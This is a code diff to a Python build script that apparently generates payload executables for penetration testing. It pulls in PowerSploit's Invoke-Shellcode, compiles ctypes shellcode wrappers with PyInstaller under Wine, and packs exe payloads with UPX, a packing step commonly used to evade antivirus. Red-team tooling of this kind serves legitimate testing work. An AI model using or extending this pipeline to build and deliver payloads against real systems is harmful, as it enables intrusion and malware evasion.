@@ -36,6 +36,9 @@ PS_INV_SC_URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/m
 PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi"
 PYTHON_MSI = os.path.basename(urlparse(PYTHON_DOWNLOAD_URL).path)
 
+UPX_DOWNLOAD_URL = "https://github.com/upx/upx/releases/download/v3.94/upx394w.zip"
+UPX_ZIP = os.path.basename(urlparse(UPX_DOWNLOAD_URL).path)
+
 PY_TEMPLATE = """#!/usr/bin/env python
 import ctypes
 
@@ -102,20 +105,24 @@ def download_file(url, local):
     write_text_file(local, r.text)
 
 
-def execute_command(c, env=None):
+def execute_command(c, env=None, shell=False):
     size = shutil.get_terminal_size()
     print('#' * size.columns)
     print()
     print("Executing {}".format(c))
     # Needed when shell = False
-    if type(c) is str:
+    if (type(c) is str and shell == False):
         c = c.split()
-    if env:
-        print("Environment: {}".format(env))
-        print()
-        subprocess.run(c, stderr=subprocess.STDOUT, env=env)
-    else:
-        subprocess.run(c, stderr=subprocess.STDOUT)
+    try:
+        if env:
+            print("Environment: {}".format(env))
+            print()
+            output = subprocess.check_output(c, stderr=subprocess.STDOUT, env=env, shell=shell).decode('utf-8')
+        else:
+            output = subprocess.check_output(c, stderr=subprocess.STDOUT, shell=shell).decode('utf-8')
+    except subprocess.CalledProcessError as e:
+        output = "Error when running {}: {}\n".format(c, e.output.decode('utf-8'))
+    print(output)
     print()
     print('#' * size.columns)
     print()
@@ -133,13 +140,20 @@ def setup_wine():
     if not os.path.exists('{}/{}'.format(SCRIPT_DIR, PYTHON_MSI)):
         print("Downloading python MSI")
         execute_command('wget -O {}/{} {}'.format(SCRIPT_DIR, PYTHON_MSI, PYTHON_DOWNLOAD_URL))
-    print("Installing python")
+    if not os.path.exists('{}/{}'.format(SCRIPT_DIR, UPX_ZIP)):
+        print("Downloading UPX zip")
+        execute_command('wget -O {}/{} {}'.format(SCRIPT_DIR, UPX_ZIP, UPX_DOWNLOAD_URL))
+    print("Setting up wine")
     # add wine env vars
     environment = get_wine_env()
     # print current env
     execute_command('env', environment)
     # setup wine dir
     execute_command('wineboot -u', environment)
+
+    print("Installing UPX")
+    execute_command("unzip -j -d {0}/drive_c/windows/system32/ {1}/{2} {3}/upx.exe".format(WINE_DIR, SCRIPT_DIR, UPX_ZIP, UPX_ZIP.replace('.zip', '')))
+    print("Installing python")
     # install python
     execute_command('wine msiexec /i {}/{} TARGETDIR=C:\Python27 ALLUSERS=1 PrependPath=1 /q'.format(SCRIPT_DIR, PYTHON_MSI), environment)
     # upgrade pip
@@ -228,7 +242,7 @@ for p in PAYLOADS:
     print()
     if p['format'] == 'exe':
         print("Generating packed payload...")
-        command = 'upx -9 -f -o {}/upx_{}.exe {}/{}.{}'.format(OUTPUT_DIR, p['filename'], OUTPUT_DIR, p['filename'], p['format'])
+        command = 'upx -9 -f -o {}/{}_upx.exe {}/{}.{}'.format(OUTPUT_DIR, p['filename'], OUTPUT_DIR, p['filename'], p['format'])
         execute_command(command)
         print()
     elif p['format'] == 'py':
@@ -239,8 +253,9 @@ for p in PAYLOADS:
         with open(tmp_file, 'wt') as tf:
             tf.write(PY_TEMPLATE.format(buf))
         print("Generating Python executable")
-        execute_command('wine pyinstaller --onefile --distpath={} {}'.format(OUTPUT_DIR, tmp_file), get_wine_env())
-        os.remove('{}/{}.spec'.format(OUTPUT_DIR, p['filename']))
+        python_exe = "{}_py".format(p['filename'])
+        execute_command('wine pyinstaller -y --onefile --distpath={0} -n {1} {2}'.format(OUTPUT_DIR, python_exe, tmp_file), get_wine_env())
+        os.remove('{}/{}.spec'.format(SCRIPT_DIR, python_exe))
         os.remove(tmp_file)
         print("Done")
         print()
